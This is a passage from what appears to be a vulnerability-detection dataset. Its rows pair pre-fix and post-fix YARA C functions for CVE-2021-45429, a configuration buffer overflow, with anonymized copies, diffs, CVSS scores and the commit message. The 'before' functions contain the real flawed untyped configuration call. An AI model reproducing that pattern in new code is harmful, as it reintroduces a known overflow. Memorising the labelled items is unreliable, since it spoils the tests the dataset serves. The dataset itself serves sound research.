match_data,
match_base,
match_offset,
match_length);
YR_STRING* string;
YR_MATCH* match;
YR_MATCH* next_match;
YR_MATCH* new_match;
uint64_t lowest_offset;
uint64_t ending_offset;
int32_t full_chain_length;
bool add_match = false;
if (matching_string->chained_to == NULL)
{
add_match = true;
}
else
{
match = context->unconfirmed_matches[matching_string->idx].head;
if (match != NULL)
lowest_offset = match->offset;
else
lowest_offset = match_offset;
match = context->unconfirmed_matches[matching_string->chained_to->idx].head;
while (match != NULL)
{
next_match = match->next;
ending_offset = match->offset + match->match_length;
if (ending_offset + matching_string->chain_gap_max < lowest_offset)
{
_yr_scan_remove_match_from_list(
match,
&context->unconfirmed_matches[matching_string->chained_to->idx]);
}
else if (
ending_offset + matching_string->chain_gap_max >= match_offset &&
ending_offset + matching_string->chain_gap_min <= match_offset)
{
add_match = true;
break;
}
match = next_match;
}
}
if (add_match)
{
uint32_t max_match_data;
FAIL_ON_ERROR(
yr_get_configuration(YR_CONFIG_MAX_MATCH_DATA, &max_match_data))
if (STRING_IS_CHAIN_TAIL(matching_string))
{
assert(matching_string->chained_to != NULL);
match =
context->unconfirmed_matches[matching_string->chained_to->idx].head;
while (match != NULL)
{
ending_offset = match->offset + match->match_length;
if (ending_offset + matching_string->chain_gap_max >= match_offset &&
ending_offset + matching_string->chain_gap_min <= match_offset)
{
_yr_scan_update_match_chain_length(
context, matching_string->chained_to, match, 1);
}
match = match->next;
}
full_chain_length = 0;
string = matching_string;
while (string->chained_to != NULL)
{
full_chain_length++;
string = string->chained_to;
}
match = context->unconfirmed_matches[string->idx].head;
while (match != NULL)
{
next_match = match->next;
if (match->chain_length == full_chain_length)
{
_yr_scan_remove_match_from_list(
match, &context->unconfirmed_matches[string->idx]);
match->match_length = (int32_t)(
match_offset - match->offset + match_length);
match->data_length = yr_min(
match->match_length, (int32_t) max_match_data);
match->data = yr_notebook_alloc(
context->matches_notebook, match->data_length);
if (match->data == NULL)
return ERROR_INSUFFICIENT_MEMORY;
memcpy(
(void*) match->data,
match_data - match_offset + match->offset,
match->data_length);
FAIL_ON_ERROR(_yr_scan_add_match_to_list(
match, &context->matches[string->idx], false));
}
match = next_match;
}
}
else      {
new_match = yr_notebook_alloc(
context->matches_notebook, sizeof(YR_MATCH));
if (new_match == NULL)
return ERROR_INSUFFICIENT_MEMORY;
new_match->base = match_base;
new_match->offset = match_offset;
new_match->match_length = match_length;
new_match->chain_length = 0;
new_match->prev = NULL;
new_match->next = NULL;
new_match->is_private = STRING_IS_PRIVATE(matching_string);
new_match->data_length = yr_min(match_length, (int32_t) max_match_data);
if (new_match->data_length > 0)
{
new_match->data = yr_notebook_alloc(
context->matches_notebook, new_match->data_length);
if (new_match->data == NULL)
return ERROR_INSUFFICIENT_MEMORY;
memcpy((void*) new_match->data, match_data, new_match->data_length);
}
else
{
new_match->data = NULL;
}
FAIL_ON_ERROR(_yr_scan_add_match_to_list(
new_match,
&context->unconfirmed_matches[matching_string->idx],
false));
}
}
return ERROR_SUCCESS;
}","static int _yr_scan_verify_chained_string_match(
YR_STRING* VAR_0,
YR_SCAN_CONTEXT* VAR_1,
const uint8_t* VAR_2,
uint64_t VAR_3,
uint64_t VAR_4,
int32_t VAR_5)
{
YR_DEBUG_FPRINTF(
2,
VAR_6,
""- %s (match_data=%p match_base=%"" VAR_7 "" match_offset=0x%"" VAR_7
"" match_length=%'d) {} \n"",
VAR_8,
VAR_2,
VAR_3,
VAR_4,
VAR_5);
YR_STRING* VAR_9;
YR_MATCH* VAR_10;
YR_MATCH* VAR_11;
YR_MATCH* VAR_12;
uint64_t VAR_13;
uint64_t VAR_14;
int32_t VAR_15;
bool VAR_16 = false;
if (VAR_0->chained_to == NULL)
{
VAR_16 = true;
}
else
{
VAR_10 = VAR_1->unconfirmed_matches[VAR_0->idx].head;
if (VAR_10 != NULL)
VAR_13 = VAR_10->offset;
else
VAR_13 = VAR_4;
VAR_10 = VAR_1->unconfirmed_matches[VAR_0->chained_to->idx].head;
while (VAR_10 != NULL)
{
VAR_11 = VAR_10->next;
VAR_14 = VAR_10->offset + VAR_10->match_length;
if (VAR_14 + VAR_0->chain_gap_max < VAR_13)
{
_yr_scan_remove_match_from_list(
VAR_10,
&VAR_1->unconfirmed_matches[VAR_0->chained_to->idx]);
}
else if (
VAR_14 + VAR_0->chain_gap_max >= VAR_4 &&
VAR_14 + VAR_0->chain_gap_min <= VAR_4)
{
VAR_16 = true;
break;
}
VAR_10 = VAR_11;
}
}
if (VAR_16)
{
uint32_t VAR_17;
FAIL_ON_ERROR(
yr_get_configuration(VAR_18, &VAR_17))
if (STRING_IS_CHAIN_TAIL(VAR_0))
{
assert(VAR_0->chained_to != NULL);
VAR_10 =
VAR_1->unconfirmed_matches[VAR_0->chained_to->idx].head;
while (VAR_10 != NULL)
{
VAR_14 = VAR_10->offset + VAR_10->match_length;
if (VAR_14 + VAR_0->chain_gap_max >= VAR_4 &&
VAR_14 + VAR_0->chain_gap_min <= VAR_4)
{
_yr_scan_update_match_chain_length(
VAR_1, VAR_0->chained_to, VAR_10, 1);
}
VAR_10 = VAR_10->next;
}
VAR_15 = 0;
VAR_9 = VAR_0;
while (VAR_9->chained_to != NULL)
{
VAR_15++;
VAR_9 = VAR_9->chained_to;
}
VAR_10 = VAR_1->unconfirmed_matches[VAR_9->idx].head;
while (VAR_10 != NULL)
{
VAR_11 = VAR_10->next;
if (VAR_10->chain_length == VAR_15)
{
_yr_scan_remove_match_from_list(
VAR_10, &VAR_1->unconfirmed_matches[VAR_9->idx]);
VAR_10->match_length = (int32_t)(
VAR_4 - VAR_10->offset + VAR_5);
VAR_10->data_length = yr_min(
VAR_10->match_length, (int32_t) VAR_17);
VAR_10->data = yr_notebook_alloc(
VAR_1->matches_notebook, VAR_10->data_length);
if (VAR_10->data == NULL)
return VAR_19;
memcpy(
(void*) VAR_10->data,
VAR_2 - VAR_4 + VAR_10->offset,
VAR_10->data_length);
FAIL_ON_ERROR(_yr_scan_add_match_to_list(
VAR_10, &VAR_1->matches[VAR_9->idx], false));
}
VAR_10 = VAR_11;
}
}
else  
{
VAR_12 = yr_notebook_alloc(
VAR_1->matches_notebook, sizeof(YR_MATCH));
if (VAR_12 == NULL)
return VAR_19;
VAR_12->base = VAR_3;
VAR_12->offset = VAR_4;
VAR_12->match_length = VAR_5;
VAR_12->chain_length = 0;
VAR_12->prev = NULL;
VAR_12->next = NULL;
VAR_12->is_private = STRING_IS_PRIVATE(VAR_0);
VAR_12->data_length = yr_min(VAR_5, (int32_t) VAR_17);
if (VAR_12->data_length > 0)
{
VAR_12->data = yr_notebook_alloc(
VAR_1->matches_notebook, VAR_12->data_length);
if (VAR_12->data == NULL)
return VAR_19;
memcpy((void*) VAR_12->data, VAR_2, VAR_12->data_length);
}
else
{
VAR_12->data = NULL;
}
FAIL_ON_ERROR(_yr_scan_add_match_to_list(
VAR_12,
&VAR_1->unconfirmed_matches[VAR_0->idx],
false));
}
}
return VAR_20;
}",VirusTotal/yara/b34b7e74c862c129b801832b6b85401fbada2b01/scan.c/vul/before/1.json,"static int _yr_scan_verify_chained_string_match(
    YR_STRING* matching_string,
    YR_SCAN_CONTEXT* context,
    const uint8_t* match_data,
    uint64_t match_base,
    uint64_t match_offset,
    int32_t match_length)
{
  YR_DEBUG_FPRINTF(
      2,
      stderr,
      ""- %s (match_data=%p match_base=%"" PRIx64 "" match_offset=0x%"" PRIx64
      "" match_length=%'d) {} \n"",
      __FUNCTION__,
      match_data,
      match_base,
      match_offset,
      match_length);

  YR_STRING* string;
  YR_MATCH* match;
  YR_MATCH* next_match;
  YR_MATCH* new_match;

  uint64_t lowest_offset;
  uint64_t ending_offset;
  int32_t full_chain_length;

  bool add_match = false;

  if (matching_string->chained_to == NULL)
  {
    // The matching string is the head of the chain, this match should be
    // added to the list of unconfirmed matches. The match will remain
    // unconfirmed until all the strings in the chain are found with the
    // correct distances between them.
    add_match = true;
  }
  else
  {
    // If some unconfirmed match exists, the lowest possible offset where the
    // whole string chain can match is the offset of the first string in the
    // list of unconfirmed matches. Unconfirmed matches are sorted in ascending
    // offset order. If no unconfirmed match exists, the lowest possible offset
    // is the offset of the current match.
    match = context->unconfirmed_matches[matching_string->idx].head;

    if (match != NULL)
      lowest_offset = match->offset;
    else
      lowest_offset = match_offset;

    // Iterate over the list of unconfirmed matches for the string that
    // precedes the currently matching string. If we have a string chain like:
    // S1 <- S2 <- S3, and we just found a match for S2, we are iterating the
    // list of unconfirmed matches of S1.
    match = context->unconfirmed_matches[matching_string->chained_to->idx].head;

    while (match != NULL)
    {
      // Store match->next so that we can use it later for advancing in the
      // list, if _yr_scan_remove_match_from_list is called, match->next is
      // set to NULL, that's why we store its current value before that happens.
      next_match = match->next;

      // The unconfirmed match starts at match->offset and finishes at
      // ending_offset.
      ending_offset = match->offset + match->match_length;

      if (ending_offset + matching_string->chain_gap_max < lowest_offset)
      {
        // If the current match is too far away from the unconfirmed match,
        // remove the unconfirmed match from the list because it has been
        // negatively confirmed (i.e: we can be sure that this unconfirmed
        // match can't be an actual match)
        _yr_scan_remove_match_from_list(
            match,
            &context->unconfirmed_matches[matching_string->chained_to->idx]);
      }
      else if (
          ending_offset + matching_string->chain_gap_max >= match_offset &&
          ending_offset + matching_string->chain_gap_min <= match_offset)
      {
        // If the distance between the end of the unconfirmed match and the
        // start of the current match is within the range specified in the
        // regexp or hex string, this could be an actual match.
        add_match = true;
        break;
      }

      match = next_match;
    }
  }

  if (add_match)
  {
    uint32_t max_match_data;

    FAIL_ON_ERROR(
        yr_get_configuration_uint32(YR_CONFIG_MAX_MATCH_DATA, &max_match_data))

    if (STRING_IS_CHAIN_TAIL(matching_string))
    {
      // The matching string is the tail of the string chain. It must be
      // chained to some other string.
      assert(matching_string->chained_to != NULL);

      // Iterate over the list of unconfirmed matches of the preceding string
      // in the chain and update the chain_length field for each of them. This
      // is a recursive operation that will update the chain_length field for
      // every unconfirmed match in all the strings in the chain up to the head
      // of the chain.
      match =
          context->unconfirmed_matches[matching_string->chained_to->idx].head;

      while (match != NULL)
      {
        ending_offset = match->offset + match->match_length;

        if (ending_offset + matching_string->chain_gap_max >= match_offset &&
            ending_offset + matching_string->chain_gap_min <= match_offset)
        {
          _yr_scan_update_match_chain_length(
              context, matching_string->chained_to, match, 1);
        }

        match = match->next;
      }

      full_chain_length = 0;
      string = matching_string;

      while (string->chained_to != NULL)
      {
        full_chain_length++;
        string = string->chained_to;
      }

      // ""string"" points now to the head of the strings chain.
      match = context->unconfirmed_matches[string->idx].head;

      // Iterate over the list of unconfirmed matches of the head of the chain,
      // and move to the list of confirmed matches those with a chain_length
      // equal to full_chain_length, which means that the whole chain has been
      // confirmed to match.
      while (match != NULL)
      {
        next_match = match->next;

        if (match->chain_length == full_chain_length)
        {
          _yr_scan_remove_match_from_list(
              match, &context->unconfirmed_matches[string->idx]);

          match->match_length =
              (int32_t) (match_offset - match->offset + match_length);

          match->data_length = yr_min(
              match->match_length, (int32_t) max_match_data);

          match->data = yr_notebook_alloc(
              context->matches_notebook, match->data_length);

          if (match->data == NULL)
            return ERROR_INSUFFICIENT_MEMORY;

          memcpy(
              (void*) match->data,
              match_data - match_offset + match->offset,
              match->data_length);

          FAIL_ON_ERROR(_yr_scan_add_match_to_list(
              match, &context->matches[string->idx], false));
        }

        match = next_match;
      }
    }
    else  // It's a part of a chain, but not the tail.
    {
      new_match = yr_notebook_alloc(
          context->matches_notebook, sizeof(YR_MATCH));

      if (new_match == NULL)
        return ERROR_INSUFFICIENT_MEMORY;

      new_match->base = match_base;
      new_match->offset = match_offset;
      new_match->match_length = match_length;
      new_match->chain_length = 0;
      new_match->prev = NULL;
      new_match->next = NULL;
      new_match->is_private = STRING_IS_PRIVATE(matching_string);

      // A copy of the matching data is written to the matches_arena, the
      // amount of data copies is limited by YR_CONFIG_MAX_MATCH_DATA.
      new_match->data_length = yr_min(match_length, (int32_t) max_match_data);

      if (new_match->data_length > 0)
      {
        new_match->data = yr_notebook_alloc(
            context->matches_notebook, new_match->data_length);

        if (new_match->data == NULL)
          return ERROR_INSUFFICIENT_MEMORY;

        memcpy((void*) new_match->data, match_data, new_match->data_length);
      }
      else
      {
        new_match->data = NULL;
      }

      // Add the match to the list of unconfirmed matches because the string
      // is part of a chain but not its tail, so we can't be sure the this is
      // an actual match until finding the remaining parts of the chain.
      FAIL_ON_ERROR(_yr_scan_add_match_to_list(
          new_match,
          &context->unconfirmed_matches[matching_string->idx],
          false));
    }
  }

  return ERROR_SUCCESS;
}","static int _yr_scan_verify_chained_string_match(
    YR_STRING* VAR_0,
    YR_SCAN_CONTEXT* VAR_1,
    const uint8_t* VAR_2,
    uint64_t VAR_3,
    uint64_t VAR_4,
    int32_t VAR_5)
{
  YR_DEBUG_FPRINTF(
      2,
      VAR_6,
      ""- %s (match_data=%p match_base=%"" VAR_7 "" match_offset=0x%"" VAR_7
      "" match_length=%'d) {} \n"",
      VAR_8,
      VAR_2,
      VAR_3,
      VAR_4,
      VAR_5);

  YR_STRING* VAR_9;
  YR_MATCH* VAR_10;
  YR_MATCH* VAR_11;
  YR_MATCH* VAR_12;

  uint64_t VAR_13;
  uint64_t VAR_14;
  int32_t VAR_15;

  bool VAR_16 = false;

  if (VAR_0->chained_to == NULL)
  {
    /* COMMENT_0 */
    /* COMMENT_1 */
    /* COMMENT_2 */
    /* COMMENT_3 */
    VAR_16 = true;
  }
  else
  {
    /* COMMENT_4 */
    /* COMMENT_5 */
    /* COMMENT_6 */
    /* COMMENT_7 */
    /* COMMENT_8 */
    VAR_10 = VAR_1->unconfirmed_matches[VAR_0->idx].head;

    if (VAR_10 != NULL)
      VAR_13 = VAR_10->offset;
    else
      VAR_13 = VAR_4;

    /* COMMENT_9 */
    /* COMMENT_10 */
    /* COMMENT_11 */
    /* COMMENT_12 */
    VAR_10 = VAR_1->unconfirmed_matches[VAR_0->chained_to->idx].head;

    while (VAR_10 != NULL)
    {
      /* COMMENT_13 */
      /* COMMENT_14 */
      /* COMMENT_15 */
      VAR_11 = VAR_10->next;

      /* COMMENT_16 */
      /* COMMENT_17 */
      VAR_14 = VAR_10->offset + VAR_10->match_length;

      if (VAR_14 + VAR_0->chain_gap_max < VAR_13)
      {
        /* COMMENT_18 */
        /* COMMENT_19 */
        /* COMMENT_20 */
        /* COMMENT_21 */
        _yr_scan_remove_match_from_list(
            VAR_10,
            &VAR_1->unconfirmed_matches[VAR_0->chained_to->idx]);
      }
      else if (
          VAR_14 + VAR_0->chain_gap_max >= VAR_4 &&
          VAR_14 + VAR_0->chain_gap_min <= VAR_4)
      {
        /* COMMENT_22 */
        /* COMMENT_23 */
        /* COMMENT_24 */
        VAR_16 = true;
        break;
      }

      VAR_10 = VAR_11;
    }
  }

  if (VAR_16)
  {
    uint32_t VAR_17;

    FAIL_ON_ERROR(
        yr_get_configuration_uint32(VAR_18, &VAR_17))

    if (STRING_IS_CHAIN_TAIL(VAR_0))
    {
      /* COMMENT_25 */
      /* COMMENT_26 */
      assert(VAR_0->chained_to != NULL);

      /* COMMENT_27 */
      /* COMMENT_28 */
      /* COMMENT_29 */
      /* COMMENT_30 */
      /* COMMENT_31 */
      VAR_10 =
          VAR_1->unconfirmed_matches[VAR_0->chained_to->idx].head;

      while (VAR_10 != NULL)
      {
        VAR_14 = VAR_10->offset + VAR_10->match_length;

        if (VAR_14 + VAR_0->chain_gap_max >= VAR_4 &&
            VAR_14 + VAR_0->chain_gap_min <= VAR_4)
        {
          _yr_scan_update_match_chain_length(
              VAR_1, VAR_0->chained_to, VAR_10, 1);
        }

        VAR_10 = VAR_10->next;
      }

      VAR_15 = 0;
      VAR_9 = VAR_0;

      while (VAR_9->chained_to != NULL)
      {
        VAR_15++;
        VAR_9 = VAR_9->chained_to;
      }

      /* COMMENT_32 */
      VAR_10 = VAR_1->unconfirmed_matches[VAR_9->idx].head;

      /* COMMENT_33 */
      /* COMMENT_34 */
      /* COMMENT_35 */
      /* COMMENT_36 */
      while (VAR_10 != NULL)
      {
        VAR_11 = VAR_10->next;

        if (VAR_10->chain_length == VAR_15)
        {
          _yr_scan_remove_match_from_list(
              VAR_10, &VAR_1->unconfirmed_matches[VAR_9->idx]);

          VAR_10->match_length =
              (int32_t) (VAR_4 - VAR_10->offset + VAR_5);

          VAR_10->data_length = yr_min(
              VAR_10->match_length, (int32_t) VAR_17);

          VAR_10->data = yr_notebook_alloc(
              VAR_1->matches_notebook, VAR_10->data_length);

          if (VAR_10->data == NULL)
            return VAR_19;

          memcpy(
              (void*) VAR_10->data,
              VAR_2 - VAR_4 + VAR_10->offset,
              VAR_10->data_length);

          FAIL_ON_ERROR(_yr_scan_add_match_to_list(
              VAR_10, &VAR_1->matches[VAR_9->idx], false));
        }

        VAR_10 = VAR_11;
      }
    }
    else  /* COMMENT_37 */
    {
      VAR_12 = yr_notebook_alloc(
          VAR_1->matches_notebook, sizeof(YR_MATCH));

      if (VAR_12 == NULL)
        return VAR_19;

      VAR_12->base = VAR_3;
      VAR_12->offset = VAR_4;
      VAR_12->match_length = VAR_5;
      VAR_12->chain_length = 0;
      VAR_12->prev = NULL;
      VAR_12->next = NULL;
      VAR_12->is_private = STRING_IS_PRIVATE(VAR_0);

      /* COMMENT_38 */
      /* COMMENT_39 */
      VAR_12->data_length = yr_min(VAR_5, (int32_t) VAR_17);

      if (VAR_12->data_length > 0)
      {
        VAR_12->data = yr_notebook_alloc(
            VAR_1->matches_notebook, VAR_12->data_length);

        if (VAR_12->data == NULL)
          return VAR_19;

        memcpy((void*) VAR_12->data, VAR_2, VAR_12->data_length);
      }
      else
      {
        VAR_12->data = NULL;
      }

      /* COMMENT_40 */
      /* COMMENT_41 */
      /* COMMENT_42 */
      FAIL_ON_ERROR(_yr_scan_add_match_to_list(
          VAR_12,
          &VAR_1->unconfirmed_matches[VAR_0->idx],
          false));
    }
  }

  return VAR_20;
}",VirusTotal/yara/b34b7e74c862c129b801832b6b85401fbada2b01/scan.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -97,7 +97,7 @@
     uint32_t max_match_data;
 
     FAIL_ON_ERROR(
-        yr_get_configuration(YR_CONFIG_MAX_MATCH_DATA, &max_match_data))
+        yr_get_configuration_uint32(YR_CONFIG_MAX_MATCH_DATA, &max_match_data))
 
     if (STRING_IS_CHAIN_TAIL(matching_string))
     {
@@ -152,8 +152,8 @@
           _yr_scan_remove_match_from_list(
               match, &context->unconfirmed_matches[string->idx]);
 
-          match->match_length = (int32_t)(
-              match_offset - match->offset + match_length);
+          match->match_length =
+              (int32_t) (match_offset - match->offset + match_length);
 
           match->data_length = yr_min(
               match->match_length, (int32_t) max_match_data);","{'deleted_lines': ['        yr_get_configuration(YR_CONFIG_MAX_MATCH_DATA, &max_match_data))', '          match->match_length = (int32_t)(', '              match_offset - match->offset + match_length);'], 'added_lines': ['        yr_get_configuration_uint32(YR_CONFIG_MAX_MATCH_DATA, &max_match_data))', '          match->match_length =', '              (int32_t) (match_offset - match->offset + match_length);']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,libyara/proc/freebsd.c,yr_process_get_next_memory_block,"YR_API YR_MEMORY_BLOCK* yr_process_get_next_memory_block(
YR_MEMORY_BLOCK_ITERATOR* iterator)
{
YR_PROC_ITERATOR_CTX* context = (YR_PROC_ITERATOR_CTX*) iterator->context;
YR_PROC_INFO* proc_info = (YR_PROC_INFO*) context->proc_info;
char buf[4096];
proc_info->vm_entry.pve_path = buf;
proc_info->vm_entry.pve_pathlen = sizeof(buf);
iterator->last_error = ERROR_SUCCESS;
uint64_t current_begin = context->current_block.base +
context->current_block.size;
uint64_t max_process_memory_chunk;
yr_get_configuration(
YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);
if (proc_info->vm_entry.pve_end <= current_begin)
{
if (ptrace(
PT_VM_ENTRY, proc_info->pid, (char*) (&proc_info->vm_entry), 0) ==
-1)
{
return NULL;
}
else
{
current_begin = proc_info->vm_entry.pve_start;
}
}
context->current_block.base = current_begin;
context->current_block.size = yr_min(
proc_info->vm_entry.pve_end - current_begin + 1,
max_process_memory_chunk);
assert(context->current_block.size > 0);
return &context->current_block;
}","YR_API VAR_0* yr_process_get_next_memory_block(
YR_MEMORY_BLOCK_ITERATOR* VAR_1)
{
YR_PROC_ITERATOR_CTX* VAR_2 = (YR_PROC_ITERATOR_CTX*) VAR_1->context;
YR_PROC_INFO* VAR_3 = (YR_PROC_INFO*) VAR_2->proc_info;
char VAR_4[4096];
VAR_3->vm_entry.pve_path = VAR_4;
VAR_3->vm_entry.pve_pathlen = sizeof(VAR_4);
VAR_1->last_error = VAR_5;
uint64_t VAR_6 = VAR_2->current_block.base +
VAR_2->current_block.size;
uint64_t VAR_7;
yr_get_configuration(
VAR_8, (void*) &VAR_7);
if (VAR_3->vm_entry.pve_end <= VAR_6)
{
if (ptrace(
VAR_9, VAR_3->pid, (char*) (&VAR_3->vm_entry), 0) ==
-1)
{
return NULL;
}
else
{
VAR_6 = VAR_3->vm_entry.pve_start;
}
}
VAR_2->current_block.base = VAR_6;
VAR_2->current_block.size = yr_min(
VAR_3->vm_entry.pve_end - VAR_6 + 1,
VAR_7);
assert(VAR_2->current_block.size > 0);
return &VAR_2->current_block;
}",,"YR_API YR_MEMORY_BLOCK* yr_process_get_next_memory_block(
    YR_MEMORY_BLOCK_ITERATOR* iterator)
{
  YR_PROC_ITERATOR_CTX* context = (YR_PROC_ITERATOR_CTX*) iterator->context;
  YR_PROC_INFO* proc_info = (YR_PROC_INFO*) context->proc_info;

  char buf[4096];

  proc_info->vm_entry.pve_path = buf;
  proc_info->vm_entry.pve_pathlen = sizeof(buf);

  iterator->last_error = ERROR_SUCCESS;

  uint64_t current_begin = context->current_block.base +
                           context->current_block.size;

  uint64_t max_process_memory_chunk;

  yr_get_configuration_uint64(
      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);

  if (proc_info->vm_entry.pve_end <= current_begin)
  {
    if (ptrace(
            PT_VM_ENTRY, proc_info->pid, (char*) (&proc_info->vm_entry), 0) ==
        -1)
    {
      return NULL;
    }
    else
    {
      current_begin = proc_info->vm_entry.pve_start;
    }
  }

  context->current_block.base = current_begin;
  context->current_block.size = yr_min(
      proc_info->vm_entry.pve_end - current_begin + 1,
      max_process_memory_chunk);

  assert(context->current_block.size > 0);

  return &context->current_block;
}","YR_API VAR_0* yr_process_get_next_memory_block(
    YR_MEMORY_BLOCK_ITERATOR* VAR_1)
{
  YR_PROC_ITERATOR_CTX* VAR_2 = (YR_PROC_ITERATOR_CTX*) VAR_1->context;
  YR_PROC_INFO* VAR_3 = (YR_PROC_INFO*) VAR_2->proc_info;

  char VAR_4[4096];

  VAR_3->vm_entry.pve_path = VAR_4;
  VAR_3->vm_entry.pve_pathlen = sizeof(VAR_4);

  VAR_1->last_error = VAR_5;

  uint64_t VAR_6 = VAR_2->current_block.base +
                           VAR_2->current_block.size;

  uint64_t VAR_7;

  yr_get_configuration_uint64(
      VAR_8, &VAR_7);

  if (VAR_3->vm_entry.pve_end <= VAR_6)
  {
    if (ptrace(
            VAR_9, VAR_3->pid, (char*) (&VAR_3->vm_entry), 0) ==
        -1)
    {
      return NULL;
    }
    else
    {
      VAR_6 = VAR_3->vm_entry.pve_start;
    }
  }

  VAR_2->current_block.base = VAR_6;
  VAR_2->current_block.size = yr_min(
      VAR_3->vm_entry.pve_end - VAR_6 + 1,
      VAR_7);

  assert(VAR_2->current_block.size > 0);

  return &VAR_2->current_block;
}",,"--- func_before
+++ func_after
@@ -16,8 +16,8 @@
 
   uint64_t max_process_memory_chunk;
 
-  yr_get_configuration(
-      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);
+  yr_get_configuration_uint64(
+      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);
 
   if (proc_info->vm_entry.pve_end <= current_begin)
   {","{'deleted_lines': ['  yr_get_configuration(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);'], 'added_lines': ['  yr_get_configuration_uint64(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,cli/yara.c,_tmain,"int _tmain(int argc, const char_t** argv)
{
COMPILER_RESULTS cr;
YR_COMPILER* compiler = NULL;
YR_RULES* rules = NULL;
YR_SCANNER* scanner = NULL;
SCAN_OPTIONS scan_opts;
bool arg_is_dir = false;
int flags = 0;
int result;
argc = args_parse(options, argc, argv);
scan_opts.follow_symlinks = follow_symlinks;
scan_opts.recursive_search = recursive_search;
if (show_version)
{
printf(""%s\n"", YR_VERSION);
return EXIT_SUCCESS;
}
if (show_help)
{
printf(
""YARA %s, the pattern matching swiss army knife.\n""
""%s\n\n""
""Mandatory arguments to long options are mandatory for ""
""short options too.\n\n"",
YR_VERSION,
USAGE_STRING);
args_print_usage(options, 43);
printf(
""\nSend bug reports and suggestions to: vmalvarez@virustotal.com.\n"");
return EXIT_SUCCESS;
}
if (threads > YR_MAX_THREADS)
{
fprintf(stderr, ""maximum number of threads is %d\n"", YR_MAX_THREADS);
return EXIT_FAILURE;
}
if (argc < 2)
{
fprintf(stderr, ""yara: wrong number of arguments\n"");
fprintf(stderr, ""%s\n\n"", USAGE_STRING);
fprintf(stderr, ""Try `--help` for more options\n"");
return EXIT_FAILURE;
}
#if defined(_WIN32) && defined(_UNICODE)
if (_setmode(_fileno(stdout), _O_U8TEXT) == -1)
{
return EXIT_FAILURE;
}
#endif
if (!load_modules_data())
exit_with_code(EXIT_FAILURE);
result = yr_initialize();
if (result != ERROR_SUCCESS)
{
fprintf(stderr, ""error: initialization error (%d)\n"", result);
exit_with_code(EXIT_FAILURE);
}
yr_set_configuration(YR_CONFIG_STACK_SIZE, &stack_size);
yr_set_configuration(YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);
yr_set_configuration(
YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);
if (rules_are_compiled)
{
if (argc != 2)
{
fprintf(
stderr,
""error: can't accept multiple rules files if one of them is in ""
""compiled form.\n"");
exit_with_code(EXIT_FAILURE);
}
FILE* fh = _tfopen(argv[0], _T(""rb""));
if (fh != NULL)
{
YR_STREAM stream;
stream.user_data = fh;
stream.read = (YR_STREAM_READ_FUNC) fread;
result = yr_rules_load_stream(&stream, &rules);
fclose(fh);
if (result == ERROR_SUCCESS)
result = define_external_variables(ext_vars, rules, NULL);
}
else
{
result = ERROR_COULD_NOT_OPEN_FILE;
}
}
else
{
if (yr_compiler_create(&compiler) != ERROR_SUCCESS)
exit_with_code(EXIT_FAILURE);
result = define_external_variables(ext_vars, NULL, compiler);
if (result != ERROR_SUCCESS)
{
print_error(result);
exit_with_code(EXIT_FAILURE);
}
if (atom_quality_table != NULL)
{
result = yr_compiler_load_atom_quality_table(
compiler, atom_quality_table, 0);
if (result != ERROR_SUCCESS)
{
fprintf(stderr, ""error loading atom quality table: "");
print_error(result);
exit_with_code(EXIT_FAILURE);
}
}
cr.errors = 0;
cr.warnings = 0;
yr_compiler_set_callback(compiler, print_compiler_error, &cr);
if (!compile_files(compiler, argc, argv))
exit_with_code(EXIT_FAILURE);
if (cr.errors > 0)
exit_with_code(EXIT_FAILURE);
if (fail_on_warnings && cr.warnings > 0)
exit_with_code(EXIT_FAILURE);
result = yr_compiler_get_rules(compiler, &rules);
yr_compiler_destroy(compiler);
compiler = NULL;
}
if (result != ERROR_SUCCESS)
{
print_error(result);
exit_with_code(EXIT_FAILURE);
}
if (show_stats)
print_rules_stats(rules);
cli_mutex_init(&output_mutex);
if (fast_scan)
flags |= SCAN_FLAGS_FAST_MODE;
scan_opts.deadline = time(NULL) + timeout;
arg_is_dir = is_directory(argv[argc - 1]);
if (scan_list_search && arg_is_dir)
{
fprintf(stderr, ""error: cannot use a directory as scan list.\n"");
exit_with_code(EXIT_FAILURE);
}
else if (scan_list_search || arg_is_dir)
{
if (file_queue_init() != 0)
{
print_error(ERROR_INTERNAL_FATAL_ERROR);
exit_with_code(EXIT_FAILURE);
}
THREAD thread[YR_MAX_THREADS];
THREAD_ARGS thread_args[YR_MAX_THREADS];
for (int i = 0; i < threads; i++)
{
thread_args[i].deadline = scan_opts.deadline;
thread_args[i].current_count = 0;
result = yr_scanner_create(rules, &thread_args[i].scanner);
